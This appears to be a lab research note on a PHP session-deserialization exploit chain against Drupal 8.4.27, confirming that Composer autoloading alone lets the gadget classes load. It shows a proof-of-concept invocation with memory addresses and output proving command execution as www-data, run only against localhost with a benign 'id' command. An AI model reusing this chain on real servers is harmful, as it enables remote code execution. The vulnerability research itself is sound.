# Drupal P5 autoload probe — no harness preload needed

**Date:** 2026-10-31  
**Scope:** LAB-ONLY, `127.0.0.1:18300`, fixed benign `id>/tmp/vd 2>&1`.

## Question

The Phase 1 consumer `lab-drupal/vd.php` called `class_exists()` on the six P5
classes before `session_start()`. Was that preload required, or does the stock
Composer autoloader resolve the gadget classes during the real session decode?

## Probe

`lab-drupal/vd_nopreload.php` is identical to `vd.php` except it **removes the
`class_exists()` loop**. It only does:

```php
require __DIR__ . '/vendor/autoload.php';
@ini_set('session.serialize_handler', 'php');
$r = @session_start();
```

## Result

Fire against the already-measured 8.4.27 addresses:

```sh
python3 poc/verify_115560_drupal.py \
  --target 127.0.0.1:18300 \
  --container php2shell-115560-drupal-8427 \
  --build 8.4.27 \
  --main 0xffff9ee00000 --delta 0x7b019 --zif 0xffffa1401510 \
  --path /vd_nopreload.php fire
```

```text
[f] payload_len=69819 cid_len=8102 nk=65 npad=4
    carrier=0xffff9ee7b02d zval_ptr=0xffff9ee7b12d zif=0xffffa1401510
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> Drupal P5 -> var_destroy -> uid=33
```

## Interpretation

- The P5 classes are autoloaded during the normal `session_start()` decode via
  `vendor/autoload.php`; no harness-specific class preloading is needed.
- The upload-progress hook's own `incomplete_classes_only` decode (PHP
  `session.c:970-975`) does not block the later app-level decode. The app
  decode is outside `in_rfc1867_update`, so autoload is active.
- This removes one potential fidelity objection to the Drupal G1 result. The
  remaining gate is the non-default `serialize_handler: php` config line, as
  documented in `docs/DRUPAL_115560.md`.
